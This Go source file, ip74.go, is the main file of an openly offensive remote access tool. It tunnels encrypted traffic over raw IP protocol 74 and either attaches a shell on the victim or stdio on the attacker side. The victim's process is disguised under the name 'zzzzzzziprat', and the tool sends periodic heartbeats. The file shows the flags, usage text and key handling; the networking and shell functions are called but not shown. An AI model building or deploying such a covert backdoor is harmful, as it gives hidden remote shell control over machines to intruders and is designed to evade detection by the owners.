package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"log"
	"os"
	"time"
)

/*
 * ip74.go
 * Program to send and receive comms over raw IP
 * By J. Stuart McMurray
 * Created 20160226
 * Last Modified 20160226
 */

const (
	HBINT    = time.Minute    /* Default heartbeet interval */
	NAME     = "zzzzzzziprat" /* Name for child process */
	REMOTE   = "127.0.0.1"    /* Default remote address */
	BUFLEN   = 65511          /* Copy buffer size */
	PROTO    = 74             /* Default IP protocol */
	KEYLEN   = 32             /* Key length */
	NONCELEN = 24             /* Nonce length, must be < BUFLEN */
)

/* Make sure BUFLEN and NONCELEN work */
func init() {
	if BUFLEN <= NONCELEN ||
		(BUFLEN+NONCELEN) > 65535 {
		panic("Invalid buffer sizes")
	}
}

func main() {
	/* Get the local address */
	loc, err := localIP()
	if nil != err {
		log.Printf("Unable to determine local address: %v", err)
	}
	var (
		laddr = flag.String(
			"l",
			loc,
			"Local `address`",
		)
		raddr = flag.String(
			"r",
			REMOTE,
			"Remote `address`",
		)
		proto = flag.Uint(
			"p",
			PROTO,
			"IP protocol `number`",
		)
		attacker = flag.Bool(
			"s",
			false,
			"Don't spawn a shell, use stdio instead "+
				"(set on attacker side)",
		)
		name = flag.String(
			"n",
			NAME,
			"Process `name` for child (ignored if -s is set)",
		)
		hbint = flag.Duration(
			"i",
			HBINT,
			"Heartbeet `interval`",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]
	
Sends and receives ip packets between the remote and local hosts and either
proxies the data to a shell or stdio.

Two newline-terminated 32-byte keys expected on stdin.  The first is for
decrypting data read from the network, and the second is to encrypt data to be
sent on the network.

If -s is given, instead of connecting a shell to the network, it connects stdio
to the network.  Use on the attacker side.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Set up networking */
	c := connect(*laddr, *raddr, *proto, *hbint)

	/* Be comms or a rat */
	if *attacker {
		attack(c)
	} else {
		shell(c, *name)
	}
	log.Printf("Done.")

}

/* getKey gets a key from stdin, or dies if it's the wrong length. */
func getKey(r *bufio.Reader) [KEYLEN]byte {
	var a [KEYLEN]byte
	/* Read the key */
	l, err := r.ReadBytes('\n')
	if nil != err {
		log.Fatalf("Error reading key: %v", err)
	}
	l = bytes.TrimRight(l, "\n")
	/* Check the length */
	if KEYLEN != len(l) {
		log.Fatalf(
			"Key wrong length.  Expected %v, got %v",
			KEYLEN,
			len(l),
		)
	}
	/* Copy it to an array */
	for i, v := range l {
		a[i] = v
	}
	return a
}
